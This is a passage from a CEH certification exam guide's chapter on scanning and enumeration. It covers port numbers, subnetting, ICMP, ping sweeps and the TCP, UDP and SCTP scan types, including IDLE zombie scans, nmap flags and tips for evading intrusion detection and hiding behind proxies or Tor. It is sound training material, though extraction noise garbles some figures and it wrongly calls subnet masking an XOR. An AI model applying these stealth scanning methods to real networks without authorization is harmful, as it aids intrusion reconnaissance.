No, you don’t need to memorize all 1024 of them, but you do need to know many of
them. The ports listed in Table 3-1 are absolutes—you simply must memorize them or
quit reading and studying for your exam here.

Port Transport Port Transport
Number Protocol Protocol Number Protocol Protocol

20/21 FTP TCP 110 POP3 TCP

22 SSH TCP 135 RPC TCP

23 Telnet TCP 137–139 NetBIOS TCP and UDP

25 SMTP TCP 143 IMAP TCP

53 DNS TCP and UDP 161/162 SNMP UDP

67 DHCP UDP 389 LDAP TCP and UDP

69 TFTP UDP 443 HTTPS TCP

80 HTTP TCP 445 SMB TCP

Table 3-1 Important Port Numbers

03-ch03.indd 95 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

96

EXAM TIP Occasionally you’ll get asked about weird ports and their use—
like maybe 631. Did you know that one was the deault or the Internet
Printing Protocol? How about 179? Would you have guessed BGP? Or
maybe 514? Did you pick syslog? The point is, there are literally thousands
o port numbers and associations. I can’t put them all in this chapter.
Thereore, do your best to memorize the common ones and use the process
o elimination to whittle down to the best answer.

Assuming you know which well-known port number is associated with which upper-
layer protocol, you can tell an awful lot about what a system is running just by knocking
on the port doors to see what is open. A system is said to be listening for a port when it
has that port open. For example, assume you have a server hosting a website and an FTP
service. When the server receives a message, it needs to know which application is going
to handle the message. At the same time, the client that made the request needs to open
a port on which to hold the conversation (anything above 1023 will work). Figure 3-5
demonstrates how this is accomplished—the server keeps track of which application to
use via the port number in the Destination Port field of the header and answers to the
source port number.

In reading this, you may be wondering just how those ports are behaving on your own
machine. The answer comes from the state the port is in. Suppose you have an applica-
tion running on your computer that is waiting for another computer to connect to it.
Whatever port number your application is set to use is said to be in a listening state. Once
a remote system goes through all the handshaking and checking to establish a session
over that open port on your machine, your port is said to be in an established state. In
short, a listening port is one that is waiting for a connection, while an established port is
one that is connected to a remote computer.

EXAM TIP CurrPorts is a tool you’ll deinitely want to play with when it
comes to ports. It displays a list o all currently opened TCP/IP and UDP
ports on your local computer, including inormation about the process that
opened the port, the process name, ull path, version inormation, the time it
was created, and the user who created it.

Figure 3-5 Source port: 12375
Destination port: 80

Port numbers
in use

Source port: 80
Destination port: 12375

Source port: 12375
Destination port: 80

03-ch03.indd 96 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

97

Ports can be in other states as well. For instance, remember that packets can be received
out of order and sometimes take a while to get in? Imagine your port sitting there in a
listening state. A remote system connects, and off you go—with the data exchange hum-
ming along. Eventually either your system or the remote system will close the session.
But what happens to any outstanding packets that haven’t made their way yet? A port
state of CLOSE_WAIT shows that the remote side of your connection has closed the
connection, whereas a TIME_WAIT state indicates that your side has closed the con-
nection. The connection is kept open for a little while to allow any delayed packets to be
matched to the connection and handled appropriately. If you’d like to see this in action
on your Windows machine, open a command prompt and use an old standby: netstat.
Typing netstat -an (see Figure 3-6) displays all connections and listening ports, with
addresses and port numbers in numerical form. If you have admin privileges on the box,
use netstat -b, and you can see the executable tied to the open port.

Figure 3-6 The command netstat

03-ch03.indd 97 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

98

Subnetting
Want to know something neat? You won’t find subnetting mentioned anywhere in
EC-Council’s official courseware for the CEHv11 certification. So you may be asking,
“Why do we even need subnetting? What’s the point?” The answer is that, depending
on which version of the exam you get, you will most likely be asked about it. Supposedly
you know this already, so this section will be a breeze (and I promise to keep it as short
as possible); however, in keeping with my promise to cover everything, we just have to
get into it.

As I’m sure you’re already aware, your system has no idea about the rest of the world,
and frankly doesn’t care. As far as it is concerned, its responsibility is to pass messages it
receives to whatever application inside needs them, and to send messages only to systems
inside its own neighborhood (network)—in effect, only systems it can see and touch.
It’s the job of someone else in the neighborhood (the router) to deliver the messages to
outside, unknown systems. And the only way that device has to identify which networks
are local and which networks are remote is the subnet mask. So what is a subnet mask?
To answer that, let’s first talk about an IPv4 address.

EXAM TIP IPv4 has three main address types—unicast (acted on by a single
recipient), multicast (acted on only by members o a speciic group), and
broadcast (acted on by everyone in the network).

As you’re already aware (because you are supposed to know this already), IPv4 addresses
are really 32 bits, each set to 1 or 0, separated into four octets by decimal points. Each one
of these addresses is made up of two sections—a network identifier and a host identifier.
The bits making up the network portion of the address are used much like the ZIP code
on letters. Local post offices (like routers) don’t care about who, individually, a message is
addressed for; they only care about which post office (network) to get the message to. For
example, the friendly sorting clerk here at my local post office doesn’t care that the letter
I put in the box to mail is addressed to Scarlett Johansson; he only cares about the ZIP
code—and 90210 letters get tossed into the “bound for the West Coast” bucket. Once
my letter gets to the post office serving 90210 customers, the individual address will be
looked at. It’s the same with IP addresses—something inside that destination network
will be responsible for getting the message to the right host. It’s the router’s job to figure
out what the network address is for any given IP address, and the subnet mask is the key.

A subnet mask is a binary pattern that is matched against any IP address to determine
which bits belong to the network side of the address, with the binary starting from left
to right, turning on all the 1’s until the mask is done. For example, if your subnet mask
wants to identify the first 12 bits as the network identification bits, the mask will look
like this: 11111111.11110000.00000000.00000000. Translate this to decimal and you
get 255.240.0.0. Were you to pair this with an IP address, it would appear something
like 12.197.44.8, 255.240.0.0. Another common way of expressing this is to simply use
a slash followed by the number of network bits. Continuing our example, the same pair
would appear as 12.197.44.8/12.

03-ch03.indd 98 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

99

Here are some rules you need to know about IP addresses and the bits that make
them up:

• If all the bits in the Host field are 1’s, the address is a broadcast (that is, anything
sent to that address will go to everything on that network).

• If all the bits in the Host field are set to 0’s, that’s the network address.
• Any combination other than all 1’s or all 0’s presents the usable range of addresses

in that network.

Let’s take a look at an example. Suppose you have an address of 172.17.15.12 and
your subnet mask is 255.255.0.0. To see the network and host portions of the address,
first convert the IP address to binary, convert the subnet mask to binary, and stack the
two, as shown here:

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 0 0 0 0 1 1 1 1 . 0 0 0 0 1 1 0 0 172.17.15.12 Address

1 1 1 1 1 1 1 1 . 1 1 1 1 1 1 1 1 . 0 0 0 0 0 0 0 0 . 0 0 0 0 0 0 0 0 255.255.0.0 Subnet mask

Every bit from left to right is considered part of the network ID until you hit a zero in
the subnet ID. This is all done in the flash of an eye by an XOR comparison (sometimes
called an XOR gate) in the router. An XOR compares two binary inputs and creates an
output: if the two inputs are the same, the output is 0; if they’re different, the output is 1.
If you look at the subnet underneath the address (in binary), it’s easy to see how the XOR
creates the network ID, but for most beginners (and not to complicate the issue further),
it’s just as easy to draw the line and see where the division happens:

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 0 0 0 0 1 1 1 1 . 0 0 0 0 1 1 0 0 172.17.15.12 Address

1 1 1 1 1 1 1 1 . 1 1 1 1 1 1 1 1 . 0 0 0 0 0 0 0 0 . 0 0 0 0 0 0 0 0 255.255.0.0 Subnet mask

Network ID bits Host ID bits

So what this shows us is that the address 172.17.15.12 is part of a network addressed
as 172.17.0.0, demonstrated by turning all the host bits to zero, as shown next:

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 0 0 0 0 1 1 1 1 . 0 0 0 0 1 1 0 0 172.17.15.12 Address

1 1 1 1 1 1 1 1 . 1 1 1 1 1 1 1 1 . 0 0 0 0 0 0 0 0 . 0 0 0 0 0 0 0 0 255.255.0.0 Subnet mask

Bring down all network bits Ignore all host bits

X X X X X X X X X X X X X X X X

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 0 0 0 0 0 0 0 0 . 0 0 0 0 0 0 0 0 True network address

172.17.0.0

03-ch03.indd 99 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

100

The usable addresses within the 172.17.0.0 network can be found by changing the
host bits. The first bit available is the first address, and all bits turned on except the last
one comprise the last address (all bits turned on represent the broadcast address). This is
displayed in the following illustration:

All host bits set to 0 = network address

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 0 0 0 0 0 0 0 0 . 0 0 0 0 0 0 0 0 Network address 172.17.0.0

First host bit set to 1, all others set to 0 = rst usable address

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 0 0 0 0 0 0 0 0 . 0 0 0 0 0 0 0 1 First usable address 172.17.0.1

All host bits set to 1, except last bit set to 0 = last usable address

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 1 1 1 1 1 1 1 1 . 1 1 1 1 1 1 1 0 Last usable address 172.17.255.254

All host bits set to 1 = broadcast address

1 0 1 0 1 1 0 0 . 0 0 0 1 0 0 0 1 . 1 1 1 1 1 1 1 1 . 1 1 1 1 1 1 1 1 Broadcast address 172.17.255.255

EXAM TIP Broadcast addressing has two main types. Limited broadcast
addresses are delivered to every system inside the broadcast domain, and
they use IP address 255.255.255.255 (destination MAC FF:FF:FF:FF:FF:FF).
In general, routers ignore all limited broadcasts and do not even open the
packets on receipt. Directed broadcasts are sent to all devices on a subnet,
and they use the subnet’s broadcast address (or example, the directed
broadcast address or 192.168.17.0/24 would be 192.168.17.255). Routers
may actually take action on these packets, depending on what’s involved.

This is easy enough when “the line” is drawn right on a decimal point. But what about
when it falls in the middle of an octet? For example, consider the address 192.168.17.39
with a subnet mask of 255.255.255.224. The same process can be followed, but notice
the line demarking the network and host bits now falls in the middle of the last octet:

1 1 0 0  0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 0 0 1 1 1 Address 192.168.17.39

1 1 1 1 1 1 1 1 . 1 1 1 1 1 1 1 1 . 1 1 1 1 1 1 1 1 . 1 1 1 0 0 0 0 0 Subnet mask 255.255.255.224

Network ID bits Host ID bits

Although it looks difficult, if you follow the same process discussed earlier—bringing
down all the network bits and manipulating the host bits to show all 0’s, all host bits off

03-ch03.indd 100 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

101

except the first, all host bits on except the last, and all host bits on—you can show the
network ID, first, last, and broadcast addresses with ease:

All host bits set to 0 = network address

1 1 0 0 0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 0 0 0 0 0 Network address 192.168.17.32

First host bit set to 1, all others set to 0 = rst usable address

1 1 0 0 0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 0 0 0 0 1 First usable address 192.168.17.33

All host bits set to 1, except last bit set to 0 = last usable address

1 1 0 0 0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 1 1 1 1 0 Last usable address 192.168.17.62

All host bits set to 1 = broadcast address

1 1 0 0 0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 1 1 1 1 1 Broadcast address 192.168.17.63

One final subnetting topic you may be asked about is how to apply the mask to a
host and determine what network it’s on. For example, suppose you have an IP address
of 192.168.17.52/28 and you need to find out what network it’s on. If you use the same
principles we just talked about—that is, translate the IP address and mask into bits, stack
them, draw your line, turn all host bits to zero—you’ll get your answer. Another, quicker
way is to simply look at the first 28 bits only and…voilà! See the following illustration
for a little more clarity:

1 1 0 0 0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 1 0 1 0 0 Address 192.168.17.52

Subnet mask /28
So just count 28 bits from the left

28th bit from left

1 1 0 0 0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 1 0 0 0 0 Turn off all bits to the right
(The host bits)

1 1 0 0 0 0 0 0 . 1 0 1 0 1 0 0 0 . 0 0 0 1 0 0 0 1 . 0 0 1 1 0 0 0 0 The netwok ID is all that remains

1 9 2 .  1 6 8 .  1 7 . 5 2

EXAM TIP A un dierentiation you almost always see on tests is that
between routing and routed protocols. Basically a routed protocol is one
that is actually being packaged up and moved around. IPv4 and IPv6, or
instance, are routed protocols. A routing protocol is the one that decides the
best way to get to the destination (or example, BGP, OSPF, or RIP).

Clear as mud, right? Trust me, don’t worry too much about it—we’re only talking
a couple of questions here and there. This is a skill you’ll need in the real world, and
you’ll find tips and tricks to help you out (for example, the network ID is always some
multiple of the decimal value of the last bit of the mask). Check out Internet resources

03-ch03.indd 101 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

102

for subnetting tips and tricks and use whatever feels best for you. Draw out a few using
the procedures listed earlier—if you take it out to bits, you’ll never get it wrong—and
you’ll be fine. There is a whole lot more involved in addressing and routing that we’re
just not going to get into here because it’s not a concern on the exam. You’ll be asked
to identify a network ID, or figure out which address belongs to which network, or
something like that. And that’s what I’ve laid out here for you.

Scanning Methodology
As you’re probably aware by now, EC-Council is in love with methodology. Sure, in the
real world you may not follow the steps blindly in order, but I don’t think that’s the point
of listing something in a methodology format. A methodology—no matter how silly it
may seem on a test or when you’re sitting there performing a real pen test—ensures you
don’t miss anything and that all your bases are covered. In that regard, I guess it’s a lot
like a preflight checklist, and this is EC-Council’s version of making sure your scanning
flight goes smoothly.

Just as the steps of the overall hacking process can blend into one another, though,
keep in mind these steps are simply guidelines and not hard-and-fast rules to follow.
When you’re on the job, situations and circumstances will occur that might force you to
change the order of steps. Sometimes the process of completing one phase will seamlessly
blend directly into another. Don’t fret—just go with the flow and get your job done. EC-
Council’s scanning methodology phases include the following steps:

1. Check for live systems. You can use something as simple as a ping. This gives you a
list of what’s actually alive on your network subnet.

2. Check for open ports. Once you know which IP addresses are active, find what
ports they’re listening on.

3. Scan beyond IDS. Sometimes your scanning efforts need to be altered to avoid
those pesky intrusion detection systems.

4. Perform banner grabbing. Banner grabbing and OS fingerprinting tell you what
operating system is on the machines and which services they are running.

5. Scan for vulnerabilities. Perform a more focused look to find any vulnerabilities
these machines haven’t been patched for yet.

6. Draw network diagrams. A good network diagram displays all the logical and
physical pathways to targets you might like.

7. Prepare proxies. This obscures your efforts so you remain hidden.

This methodology has about as much to do with real life as I have to do with an Oscar
nomination, but it’s a memorization effort you have to do. ECC didn’t intend it as much a
step-by-step procedure as a checklist to make sure you get to everything you are supposed
to during this phase. Regardless of which order you proceed in, if you hit all the steps,
you’re probably going to be successful in your scanning efforts. We’ll delve more into each
step later in this chapter, but first we need to revisit some networking knowledge essential
for successful scanning.

03-ch03.indd 102 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

103

EXAM TIP Commit these scanning steps to memory and pay close attention
to what actions are perormed in each—especially which tools might be
used to perorm those actions.

Identifying Targets
In the ECC scanning methodology, checking for live systems is the first step. The sim-
plest and easiest way to do this is to take advantage of a protocol that’s buried in the
stack of every TCP/IP-enabled device on the planet—Internet Control Message Protocol
(ICMP). As I’m sure you’re already aware, IP is what’s known as a connectionless, “fire-
and-forget” protocol. It creates a packet by taking data and appending a header, which
holds bunches of information, including the “From” and “To” addresses, and allows the
sender to fire packets away without regard, as quickly as the stack on the machine will
allow. This is done by relying on protocols in other layers for transport, error correction,
and so on.

However, some shortfalls needed to be addressed at the Network layer. IP itself has no
error messaging function, so ICMP was created to provide that function. ICMP allows for
error messaging at the Network layer and presents the information to the sender in one of
several ICMP types. Table 3-2 lists some of the more relevant message type codes you’ll
need to know for the exam. The most common of these are Type 8 (Echo Request) and
Type 0 (Echo Reply). An ICMP Type 8 packet received by a host tells the recipient, “Hey!
I’m sending you a few packets. When you get them, reply with the same number so I
know you’re there.” The recipient responds with an ICMP Type 0, stating, “Sure, I’m alive.
Here are the data packets you just sent me as proof !”

ICMP Message Type Description and Important Codes

0: Echo Reply Answer to a Type 8 Echo Request

3: Destination Unreachable Error message indicating the host or network cannot be
reached. The codes ollow:
0—Destination network unreachable
1—Destination host unreachable
6—Network unknown
7—Host unknown
9—Network administratively prohibited
10—Host administratively prohibited
13—Communication administratively prohibited

4: Source Quench A congestion control message

5: Redirect Sent when there are two or more gateways available or the
sender to use and the best route available to the destination is
not the conigured deault gateway. The codes ollow:
0—Redirect datagram or the network
1—Redirect datagram or the host

8: Echo Request A ping message, requesting an Echo Reply

11: Time Exceeded The packet took too long to be routed to the destination (code
0 is TTL expired)

Table 3-2 Relevant ICMP Message Types

03-ch03.indd 103 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

104

Because ICMP is built into each TCP/IP device and the associated responses pro-
vide detailed information about the recipient host, ICMP is a good place to start when
network scanning. For example, consider an Echo Request (Type 8) sent to a host that
returns a Type 3. The code could tell us whether the host is down (Code 1), the network
route is missing or corrupt in our local route tables (Type 0), or a filtering device, such as
a firewall, is preventing ICMP messages altogether (Type 13).

NOTE The actual payload o a ping packet can range greatly in value
amount. The request or comment (RFC 792, https://tools.iet.org/html/
rc792) that created and still governs ping never got around to identiying
what data is supposed to go into the payload, so it’s usually just enough
ASCII code to build the packet up to suicient length. Knowing this, the
payload o an ICMP packet could wind up being the perect covert channel
or hackers to communicate with each other, using the payload area to
simply embed messages. Most people—even security types—wouldn’t even
bother with a ping packet or two crossing their paths, never knowing what
inormation was being unneled away right beneath their noses.

A few IDS signatures do look for this. For example, a lot of ping utilities designed to
take advantage of this have default signatures that any decent IDS can pick up on; in
Nmap, a “0 byte field” can trigger it, for example. Windows and other operating systems
have specific defaults that are supposed to be found in the packet, and their alteration or
omission can also trigger a hit. But none of this changes the fact that it’s still a cool hack.

This process, called a ping, has been part of networking since its inception, and com-
bining pings to every address within a range is known as a ping sweep. A ping sweep is
the easiest method available to identify active machines on the network, and there are
innumerable tools to help you pull it off (Figure 3-7 shows Zenmap, Nmap’s Windows
GUI version, pulling it off on my little wireless network). Just keep in mind that this is
not necessarily the only, or even best, way to do it. Although ICMP is part of every TCP/
IP stack, it’s not always enabled. In fact, many administrators disable ping responses on
many network systems and devices and configure firewalls to block them. Lastly, if you
add IPv6 to the mix, it really muddies the waters. Scanning in IPv6 is much more dif-
ficult and complex, and ping sweeps often don’t work at all in most tools.

EXAM TIP ECC also calls out pinging o the network ID itsel (that is,
sending ICMP Echo Request packets to the network IP address) as “ICMP
Echo scanning.” Additionally, another option or identiying machines (not
necessarily live ones, but ones that were live at some point) is called a “list
scan”—basically just run a reverse DNS lookup on all IPs in the subnet.

Additionally, not only will a great many devices not respond to the ping, the actual
ping sweep itself can be noisy, and the systems may alert anyone and everyone as to
what’s going on. Network-based intrusion detection systems (NIDSs) and host-based
IDSs (HIDSs) can easily and readily pick up on a ping sweep from an external source

03-ch03.indd 104 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

105

Figure 3-7 Using Nmap to perorm a ping sweep

if it is not carried out slowly and with some stealth. With this in mind, be cautious and
deliberate with your sweep—slow and random are your friends here. Remember, hacking
isn’t a race; it’s a test of will, patience, and preparation.

EXAM TIP Know ICMP well. Pay particular attention to Type 3 messages
and the associated codes, especially Code 13, which lets you know a poorly
conigured irewall is preventing the delivery o ICMP packets.

Several applications are available to make the ping sweep as simple as possible for you
to pull off. Nmap is, of course, probably the most referenced scanning tool on the exam
and in the real world. Angry IP Scanner is another well-known tool; just be careful with
it because a lot of antivirus programs consider it a virus. Some other tools of note are
SolarWinds Engineer’s Toolset, Network Ping, OpUtils, SuperScan, Advanced IP Scan-
ner, and a wacky little tool called Pinkie.

NOTE When using ping to identiy “live” hosts, keep in mind a nonresponse
to ICMP does not necessarily mean the host isn’t alive—it simply means it
won’t respond to ICMP.

One last quick point about scanning for active machines before we move forward:
Remember at the opening of this section that I mentioned the scanning steps may bleed
into one another? Identifying active machines on the network using a ping sweep is not
the only method available. Sometimes it’s just as easy to combine the search for active

03-ch03.indd 105 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

106

machines with a port scan, especially if you’re trying to be sneaky about it. Granted, this
isn’t the steadfast “follow the methodology” mindset of the exam, but it is reality. So,
what is a port scan? Glad you asked.

NOTE I you want to be legitimately sneaky, tons o methods are available.
Check out the details or a un option at https://www.aldeid.com/wiki/Tor/
Usage/Nmap-scan-through-tor.

Port Scanning
Imagine you’re a bad guy in a movie sizing up a neighborhood for a potential run of
nighttime thievery. You’ll probably do a little harmless driving around, checking out the
perimeter and seeing what’s between the neighborhood and the rest of the world. You’ll
also pay attention to which houses are “live,” with residents and stuff inside you may find
valuable. But that gives you only background information. It’s really valuable if you can
figure out which doors are locked, which windows are open, and which ones have alarms
on them. Walk with me in the virtual world, my movie-villain thief, and let’s go knock
on some computer doors to see what’s hiding there.

“How do we do it?” you may ask. The answer is, of course, by using several different
methods and with several different tools. We can’t possibly cover them all here, but we’ll
definitely spend some time on those you’ll see most often on your exam. Regardless, all
port scanners work by manipulating Transport layer protocol flags in order to identify
active hosts and scan their ports. And now that you know a little more about this process,
let’s take a look at the different types of port scans we have available to us.

Port Scan Types
A scan type is identified based on three factors: what flags are set in the packets before
delivery, what responses you expect from ports, and how stealthily the scan works. As far
as your exam is concerned, count on being asked about each of these scan type factors at
least once. Generally, there are seven generic scan types for port scanning:

• Full connect Also known as a TCP connect or full open scan, this runs through
a full connection (three-way handshake) on ports, tearing it down with an RST
at the end. It is the easiest type to detect, but it’s possibly the most reliable. Open
ports respond with a SYN/ACK, and closed ports respond with an RST.

• Stealth Also known as a half-open scan (or SYN scan), this sends only SYN
packets to ports (no completion of the three-way handshake ever takes place).
Responses from ports are the same as they are for a TCP connect scan. This
technique is useful in hiding your scanning efforts, possibly bypassing firewalls
and monitoring efforts by hiding as normal traffic (it simply doesn’t get noticed
because there is no connection to notice).

• Inverse TCP flag This scan uses the FIN, URG, or PSH flag (or, in one
version, no flags at all) to poke at system ports. If the port is open, there is no
response at all. If the port is closed, an RST/ACK is sent in response. You know,
the inverse of everything else.

03-ch03.indd 106 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

107

NOTE Naming conventions or scans in ECC’s world can sometimes get kind
o unny. Versions o the inverse TCP lag scan used to be called the FIN scan
or the NULL scan. Stealth scans used to be known as SYN scans. Why does
ECC change names? Your guess is as good as mine!

• XMAS A Christmas scan is so named because all flags are turned on, so the
packet is “lit up” like a Christmas tree. Port responses are the same as with
an inverse TCP scan. XMAS scans do not work against Microsoft Windows
machines due to Microsoft’s TCP/IP stack implementation (Microsoft TCP/IP
is not RFC 793 compliant).

• ACK flag probe According to ECC, there are two versions of this scan, both
of which use the same method: the attacker sends the ACK flag and looks at the
return header (TTL field or Window field) to determine the port status. In the
TTL version, if the TTL of the returned RST packet is less than 64, the port is
open. In the Window version, if the window size on the RST packet has anything
other than zero, the port is open.

EXAM TIP ACK lag probes can also be used to check iltering at the remote
end. I an ACK is sent and there is no response, this indicates a stateul irewall
is between the attacker and the host. I an RST comes back, there is not.

• IDLE This uses a spoofed IP address (an idle zombie system) to elicit port
responses during a scan. Designed for stealth, this scan uses a SYN flag and
monitors responses as with a SYN scan.

• TCP Maimon This sends the FIN and ACK flags. If there is no response,
the port is open. If the port is closed, it responds with an RST packet. Modern
systems rarely exhibit this behavior, however, sending RST back on all ports.

All of these scans should be easy enough to decipher given a cursory understanding of
TCP flags and what each one is for, with the possible exception of the IDLE scan. Sure,
the IDLE scan makes use of TCP flags (the SYN and ACK flags, in this case), but the
way it’s all used is brilliant (heck, it’s almost elegant) and provides the additional benefit
of obfuscation. Because the machine actually receiving the response from the targets is
not your own, the source of the scan is obscured. Confused? No worries—keep reading.

Every IP packet uses something called an IP identifier (IPID) to help with the pesky
problem of keeping track of fragmentation (IP packets can be only so big, so a single
packet is sometimes fragmented and needs to be put back together at the destination).
Most systems simply increase this IPID by one when they send a packet out. For exam-
ple, the first packet of the day might have an IPID of 31487, and the second 31488. If
you understand this concept, can spoof an IP address, and have a remote machine that’s
not doing anything, this all makes perfect sense.

First, an attacker sets up or makes use of a machine that isn’t doing anything at all
(sitting IDLE). The attacker next sends a packet (SYN/ACK) to this idle machine and
makes note of the IPID in response; the zombie machine isn’t expecting a SYN/ACK
and will respond with an RST packet, basically stating, “Can we start over? I don’t really

03-ch03.indd 107 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

108

recognize this communications session.” With the current IPID number in hand, the
attacker sends a packet with a spoofed IP address (matching the lazy zombie system)
and the SYN flag set to the target. If the port is open, the target happily responds to
the zombie with a SYN/ACK packet to complete the three-way handshake. The zombie
machine responds to the target system with an RST packet, which of course increments
the IPID by one. All the attacker has to do now is send another SYN/ACK to the zombie
and note the IPID. If it increased by two, the idle system sent a packet and, therefore, the
port is open. If it’s not open, it will have increased by only one. If this seems unclear or
you’re one of those “visual learners,” check out Figure 3-8 for an example of an open port
exchange, and see Figure 3-9 for the closed port example.

In addition to knowing how to read the responses from an IDLE scan, you’ll be asked
repeatedly on the exam about the other scan types and what response to expect from an
open or closed port. If you know the flags and what they do, this is easy. If not, Table 3-3
should be of help in studying this.

Finally, with all this talk about TCP, perhaps at least a few of you are asking, “Yeah
that’s great, but what about connectionless scanning?” I’m glad you asked—a UDP scan is
exactly what it sounds like: send a datagram to the port and see what you get in response.
Because there is no handshake, if the port is open, you won’t receive anything back—if
the port is closed, you’ll receive an ICMP port unreachable message.

SYN/ACK packet to IDLE zombie
1

RST packet in return. IPID = 34567

5
SYN/ACK packet to IDLE zombie

RST packet in return. IPID = 34569

2

4
3

Figure 3-8 IDLE scanning: port open

03-ch03.indd 108 14/09/21 3:54 PM

SYN/ACK sent to 
R zo
ST m

 s be in e
t  i
 n 

I b r
P y eI sD  z p o

n m oo n
w b sie e =   i3 n4  r5 e6 s8 ponse

ith
 IP

s

SY
N p

ac
ke

t t
o 

ta
rg

et
 w e

s
dd

r

s a
bi

e’

sp
oo

fe
d 

to
 zo

m



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

109

SYN/ACK packet to IDLE zombie
1

RST packet in return. IPID = 34567

5
SYN/ACK packet to IDLE zombie

RST packet in return. IPID = 34568

2 4

No response from
zombie to an RST

3 packet. IPID remains
unchanged (34567).

Figure 3-9 IDLE scanning: port closed

Open Port Closed Port
Scan Type Initial Flags Set Response Response Notes

Full SYN SYN/ACK RST Noisiest but most
(TCP connect) reliable.*

Stealth SYN SYN/ACK RST No completion o
three-way handshake;
designed or stealth
but may be picked up
by IDS sensors.

XMAS FIN, URG, or PSH No response RST Doesn’t work on
Windows machines.

Inverse TCP FIN, URG, or PSH No response RST/ACK Doesn’t work on
(or no lags at all) Windows machines.

*While the “noisiest”descriptor is valid or your exam, the “reliable”portion is much more apropos or your real-lie adventures.
A ull connect scan may very well be noted in the application log as a simple connect. The key isn’t the traic; it’s the speed
at which you run it (slow is better).

Table 3-3 Network Scan Types

03-ch03.indd 109 14/09/21 3:54 PM

RST p
(c a

l c
o ks ee td  s p en

ar t
t  t
 r o
e  zsp om

on bs ie e
)ith

 IP

SY
N p

ac
ke

t t
o 

ta
rg

et
 w

bi
e’s

 ad
dr

es
s

sp
oo

fe
d 

to
 zo

m



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

110

NOTE UDP ports and communication are otentimes employed by malware,
such as spyware programs and Trojans.

A couple other relatively new and different scan types involve SCTP. Stream Control
Transmission Protocol is a relatively new alternative to TCP and UDP, and combines
most of their characteristics while adding multi-homing and multi-streaming. SCTP is
a Transport layer communications protocol in the IP suite, originally released as part of
Free BSD version 7, providing the message-oriented feature of UDP, while keeping the
reliability and congestion control as provided by TCP.

The two main scanning efforts involving SCTP are SCTP INIT scanning and
SCTP COOKIE Scanning. Per Nmap Network Scanning, Chapter 15, at Nmap.org, an
SCTP INIT scan, “…is the SCTP equivalent of a TCP SYN scan. It can be performed
quickly, scanning thousands of ports per second on a fast network not hampered by
restrictive firewalls. It is relatively unobtrusive and stealthy, since it never completes
SCTP associations and allows clear, reliable differentiation between the open, closed,
and filtered states. Much like the half-open scan, this effort doesn’t open a full SCTP
association. An INIT chunk is sent, as if opening a real association. An INIT-ACK
chunk response indicates the port is listening (open), while an ABORT chunk is
indicative of a non-listener. If no response is received after several retransmissions, the
port is marked as filtered.”

EXAM TIP SCTP INIT scans are perormed using the -sY argument in nmap.
SCTP COOKIE scans use the -sZ argument.

The second type, an SCTP COOKIE ECHO scan, is more advanced. Again from
Nmap.org:

It takes advantage of the fact that SCTP implementations should silently drop
packets containing COOKIE ECHO chunks on open ports, but send an ABORT
if the port is closed. The advantage of this scan type is that it is not as obvious
as an INIT scan. Also, there may be non-stateful firewall rulesets blocking INIT
chunks, but not COOKIE ECHO chunks.

It is important to note also that SCTP COOKIE ECHO scans cannot differentiate
